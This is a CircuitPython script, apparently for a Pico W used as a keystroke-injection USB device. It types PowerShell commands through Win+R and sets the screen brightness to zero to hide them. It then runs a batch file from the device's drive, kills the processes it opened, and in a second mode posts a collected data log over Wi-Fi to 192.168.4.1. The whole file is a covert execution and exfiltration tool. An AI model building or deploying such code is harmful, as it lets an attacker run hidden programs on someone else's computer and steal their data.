#IMPORTS
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
import time
import board
import digitalio
import ssl
import wifi
import socketpool
import adafruit_requests
import json
#SETUP
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
lst = ["D:","E:","F:","G:","H:","I:","J:"]
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT
led.value = False
with open("Borealis/settings.txt") as f:
    mode = str(f.readlines()[6]).replace("\n","").strip()
#FUNCTIONS
def hid():
    time.sleep(1)
    kbd.send(Keycode.WINDOWS,Keycode.R)
    time.sleep(0.125)
    layout.write('powershell\n')
    time.sleep(1)
    layout.write("(Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 0)\n")
    layout.write(f'{";".join(lst)}\n')
    layout.write("taskkill /f /im pythonw.exe;./run.bat; timeout /t 1; taskkill /F /IM cmd.exe; (Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 100); taskkill /F /IM powershell.exe\n")
    while True: led.value = True
def send(jsondata=None):
    wifi.radio.connect("Borealis", "pico-pico")
    pool = socketpool.SocketPool(wifi.radio)
    requests = adafruit_requests.Session(pool, ssl.create_default_context())
    request_header={
        'X-HTTP-Method-Override': 'GET'
    }
    f = open('data.json',encoding='utf-8')
    if jsondata:
        response = requests.post("http://192.168.4.1/", json=jsondata, headers=request_header)
    else:
        data = json.load(f)
        data["log"] = ">:" + data["log"] + ":<"
        f.close()
        response = requests.post("http://192.168.4.1/", json=data, headers=request_header)
#MAINLOOP
if mode == "True":
    print("HID Mode Activated")
    hid()
else:
    print("FEEDBACK Mode Activated")
    #start loop here
    try:
        #code to get data here
        send() #send data
    except adafruit_requests.OutOfRetries:
        print("FEEDBACK Sent")
    #end loop here
    while True: led.value = True #FEEDBACK FINISHED
